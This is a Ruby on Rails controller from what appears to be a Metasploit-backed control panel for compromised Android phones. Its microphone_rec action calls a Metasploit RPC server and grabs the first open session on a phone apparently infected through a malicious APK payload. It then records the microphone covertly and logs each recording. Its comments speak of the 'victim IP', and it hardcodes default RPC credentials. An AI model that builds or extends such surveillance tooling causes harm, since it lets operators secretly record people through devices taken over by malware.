class RecordingsController < InheritedResources::Base
  def microphone_rec
    begin
      duration = params[:time].present? ? params[:time].to_i : 10
      @smartphone = Smartphone.find(params[:smartphone_id])
      
      # Retrieve session ID relative to this smartphone
      # In V5, we assume the session ID is stored or retrievable via the payload name
      # Example: The payload name effectively maps to a session in the RPC client
      session_id = get_active_session_id(@smartphone)
      
      if session_id
         recorder = AudioRecorderService.new(session_id)
         result = recorder.record(duration: duration)
         
         if result[:success]
            currentTimeFormat = DateTime.now.strftime("%Y-%m-%d %H:%M:%S")
            @fileName = result[:filename]
            
            newRec = Recording.new(
              :date => currentTimeFormat,
              :duration => duration,
              :filename => @fileName,
              :smartphone_id => @smartphone.id
            )
            newRec.save!
            commandOutput = ["Recording Successful", "Saved to #{@fileName}"]
         else
            commandOutput = ["Recording Failed", "#{result[:error]}"]
         end
      else
         commandOutput = ["No active session found", "for this device"]
      end

    rescue => e
      Rails.logger.error("Error in microphone_rec: #{e.message}")
      commandOutput = ["Operation Failed", e.message.truncate(30)]
    end
    respond_to do |format|
      format.js {
        render "microphone_rec",
               :locals => { :commandOutput => commandOutput,
                            :fileName => @fileName }
      }
    end
  end

  private
  
  def get_active_session_id(smartphone)
     # Simple lookup logic (simplified)
     # In reality, might need to query MSF for sessions matching the IP/Port
     client = Msf::RPC::Client.new(
        host: ENV['MSF_RPC_HOST'] || 'metasploit',
        port: 3333,
        uri: '/api/',
        ssl: true,
        username: ENV['MSF_RPC_USER'] || 'cool',
        password: ENV['MSF_RPC_PASSWORD'] || 'looc'
      )
      sessions = client.call('session.list')
      # This is tricky. We need to match the session to the smartphone.
      # Usually done by IP.
      # Let's trust the first available session for this prototype or check if @smartphone has an IP field.
      # smartphone.apk_installation.apk_payload.destination_ip is the listener.
      # We need the victim IP?
      # For now, return the FIRST session key as we only have one test device.
      sessions.keys.first
  end


  private

  def recording_params
    params.require(:recording).permit(:date,
                                      :duration,
                                      :filename,
                                      :smartphone_id)
  end
end
